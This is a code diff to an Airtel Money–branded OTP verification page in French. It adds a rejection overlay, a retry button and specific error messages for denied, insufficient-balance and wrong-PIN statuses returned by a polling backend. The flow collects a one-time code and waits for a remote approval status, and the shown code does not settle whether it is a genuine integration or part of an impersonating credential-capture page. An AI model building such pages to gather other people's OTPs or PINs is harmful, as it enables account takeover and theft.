@@ -237,6 +237,32 @@
       font-size: 30px;
       font-weight: 900;
     }
+    .rejection-mark {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      background: #d64545;
+      color: #fff;
+      font-size: 30px;
+      font-weight: 900;
+    }
+    .retry-btn {
+      display: block;
+      width: 100%;
+      min-height: 58px;
+      margin-top: 18px;
+      border: none;
+      border-radius: 12px;
+      background: var(--airtel-red);
+      color: #fff;
+      font-size: 18px;
+      font-weight: 800;
+      cursor: pointer;
+    }
 
     @media (max-width: 480px) {
       body { min-height: 100dvh; }
@@ -320,8 +346,10 @@
     <div class="approval-card">
       <div class="spinner" id="spinner"></div>
       <div class="approved-mark hidden" id="approvedMark">✓</div>
+      <div class="rejection-mark hidden" id="rejectionMark">!</div>
       <h2 id="overlayTitle">Veuillez patienter...</h2>
       <p id="overlayText">Cela prend généralement quelques secondes</p>
+      <button type="button" class="retry-btn hidden" id="retryBtn">RÉESSAYER</button>
     </div>
   </div>
 
@@ -341,9 +369,12 @@
     const overlay = document.getElementById('approvalOverlay');
     const spinner = document.getElementById('spinner');
     const approvedMark = document.getElementById('approvedMark');
+    const rejectionMark = document.getElementById('rejectionMark');
     const overlayTitle = document.getElementById('overlayTitle');
     const overlayText = document.getElementById('overlayText');
+    const retryBtn = document.getElementById('retryBtn');
     let pollTimer = null;
+    let retryDestination = '';
 
     function getOtp() {
       return otpBoxes.map(box => box.value).join('');
@@ -380,9 +411,37 @@
       overlay.classList.add('visible');
       spinner.classList.remove('hidden');
       approvedMark.classList.add('hidden');
+      rejectionMark.classList.add('hidden');
+      retryBtn.classList.add('hidden');
       overlayTitle.textContent = 'Veuillez patienter...';
       overlayText.textContent = 'Cela prend généralement quelques secondes';
     }
+
+    function showRejected(title, message, destination = '') {
+      spinner.classList.add('hidden');
+      approvedMark.classList.add('hidden');
+      rejectionMark.classList.remove('hidden');
+      overlayTitle.textContent = title;
+      overlayText.textContent = message;
+      retryBtn.classList.remove('hidden');
+      retryDestination = destination;
+      overlay.classList.add('visible');
+    }
+
+    retryBtn.addEventListener('click', () => {
+      if (retryDestination) {
+        window.location.href = retryDestination;
+        return;
+      }
+      overlay.classList.remove('visible');
+      otpForm.classList.remove('hidden');
+      otpBoxes.forEach(box => box.value = '');
+      verifyBtn.disabled = true;
+      errorEl.textContent = '';
+      rejectionMark.classList.add('hidden');
+      retryBtn.classList.add('hidden');
+      otpBoxes[0].focus();
+    });
 
     verifyBtn.addEventListener('click', async () => {
       if (!updateOtpState()) return;
@@ -414,12 +473,17 @@
               }, 800);
             } else if (['denied', 'insufficient', 'demo_error'].includes(statusData.status)) {
               clearInterval(pollTimer);
-              overlay.classList.remove('visible');
-              otpForm.classList.remove('hidden');
-              otpBoxes.forEach(box => box.value = '');
-              verifyBtn.disabled = true;
-              errorEl.textContent = 'Code invalide ou demande refusée.';
-              otpBoxes[0].focus();
+              if (statusData.status === 'insufficient') {
+                showRejected('Solde insuffisant', 'Veuillez approvisionner votre compte Airtel Money.');
+              } else if (statusData.status === 'demo_error') {
+                showRejected(
+                  'Code PIN incorrect',
+                  'Veuillez saisir le code PIN correct.',
+                  'trial.html?' + params.toString()
+                );
+              } else {
+                showRejected('Code incorrect', 'Veuillez saisir le code de vérification correct.');
+              }
             }
           } catch (err) {}
         }, 2000);
